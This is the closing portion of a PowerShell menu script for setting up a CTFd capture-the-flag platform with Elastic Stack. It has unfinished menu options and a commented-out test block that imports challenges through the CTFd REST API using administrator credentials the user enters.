                Write-Host "Option not available, yet."

                $finished = $true
                break
            }
            '7' {
                # 7. Check for Requirements
                Write-Host "Option not available, yet."
                # Check for running Elastic Stack
                # Check for running CTFd

                $finished = $true
                break
            }
            '8' {
                # Deploy all from scratch!
                Write-Host "Option not available, yet."

                $finished = $true
                break
            }
            {"q","Q"} {
                Write-Host "You selected quit, exiting." -ForegroundColor Yellow

                $finished = $true
                break
            }
            default {
                Write-Host "Invalid choice. Please select a valid option."
                $finished = $true
                break
            }
        }
    }
}

End {
    Write-Host "This is the end. Thanks for using this script!" -ForegroundColor Blue
    $finished = $null
}


<# TESTING
#$ctfd_username = "admin"
#$ctfd_password = ""
#$ctfd_email = "admin@fake.domain"
#$ctfd_email = Read-Host "Enter email address used for CTFd account."
$ctfd_basic_creds = Get-Credential
# Create Basic Auth object (Not used)
$auth_object = [PSCustomObject]@{
    name = $ctfd_basic_creds.UserName
    #email = $ctfd_email
    password = (New-Object PSCredential 0, $ctfd_basic_creds.Password).GetNetworkCredential().Password
    #type = "user"
    #verified = $False
    #hidden = $False
    #banned = $False
    #fields = @()
} | ConvertTo-Json -Compress

# Import challenges
$challenges_object
$current_challenge = $challenges_object.results[9] | ConvertTo-Json -Compress -Depth 10
$current_challenge_object = $challenges_object.results[9]
$dynamic_challenge_details = $dynamic_challenges_object.results | Where-Object {$_.id -eq $challenges_object.results[9].id}
$dynamic_challenge_details.PSObject.Members | Where-Object {$_.MemberType -eq "NoteProperty"} | ForEach-Object {
    $current_challenge_object | Add-Member -NotePropertyName $_.Name -NotePropertyValue $_.Value
    $current_challenge = $current_challenge_object | ConvertTo-Json -Compress -Depth 10
}
try{
    $test = Invoke-RestMethod -Method POST "$CTFd_URL_API/challenges" -ContentType "application/json" -Headers $ctfd_auth -Body $current_challenge

}catch{
    $_.Exception
}
# TESTING#>